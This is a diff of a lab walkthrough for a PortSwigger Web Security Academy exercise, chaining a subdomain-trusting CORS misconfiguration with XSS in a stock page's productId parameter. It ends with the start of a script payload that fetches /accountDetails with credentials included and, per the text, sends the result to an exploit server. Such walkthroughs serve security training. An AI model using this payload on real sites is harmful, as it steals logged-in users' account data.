@@ -224,17 +224,17 @@ Lets try to test the CORS security context adding the <b>origin</b> header to th
 + Origin: https://www.google.it -> fails as above
 + Origin: https://test.LAB-ID..web-security-academy.net -> <b>OK</b>: the value is reflected into Access-Control-Allow-Origin response header
 <br>![img](./img/56.png)<br>
-So we know that we can issue cross-site request from a subdomain. Now we have to find a vulnerability to be exploited through a valid sunbdomain, again lets inspect the Burp history while we navigate the lab. 
+So we know that we can issue cross-site request from a subdomain. Now we have to find a vulnerability to be exploited through a web page hosted in a lab sunbdomains, again lets inspect the Burp history while we navigate the lab. 
 <br>![img](./img/57.png)<br>
-From the above image we can see that a call to the <b>stock subdomain</b> is performed to check the stock amount, then sending the request to the Repeater we can try to verify if the QS parameter are injectable:
+From the above image we can see that a call to the <b>stock subdomain</b> is performed to check the stock amount, then sending the request to the Repeater we can try to verify if the query string parameters are injectable:
 <br>![img](./img/58.png)<br>
-So the <b>productId</b> parameter is right to us, since  is prone to XSS attacks, we can take advantages of this vulnerability to exploit the CORS security lack. First of all, we will test if we are able to get the account details information for the current user, from the vulnerable stock web page hosted in the lab subdomain. We will delivery the following payload to try to get the account details for our current logged user (we must use credentials: 'include' in the fetch request to pass the credentials).
+The <b>productId</b> parameter is right to us, since  is prone to XSS attacks, we can take advantages of this vulnerability to exploit the CORS security lack. First of all, we will test if we are able to get the account details information for the current user, from the vulnerable stock web page hosted in the lab subdomain. We will delivery the following payload to try to get the account details for the current logged user (we must use credentials: 'include' in the fetch request to pass the credentials).
 <br>![img](./img/59.png)<br>
 Further we can see the response in the browser (right click in request section in the Repeater to get the URL)
 <br>![img](./img/60.png)<br>
-Finally we craft the payload to be included in the exploit server, we have to direct the flow to the vulnerable stock page first, then we redirect the response containing the account details to the exploit server in the query string:
+Finally we craft the payload to be set in the exploit server, we have to direct the flow to the vulnerable stock page first, then we redirect the response containing the account details to the exploit server log page as the query string parameter:
 <br>![img](./img/61.png)<br>
-As shown in the image above I encoded in URL format the actual payload passed as <b>productID parameter</b> (highlighted), for your convenience this is the plain version:
+As shown in the image above, I encoded (URL format) the actual payload passed as <b>productID parameter</b> (highlighted), for your convenience this is the plain version:
 ```
 <script>
 fetch('https://0a6e004204f74b30c142e98100f9006b.web-security-academy.net/accountDetails', {credentials: 'include'})
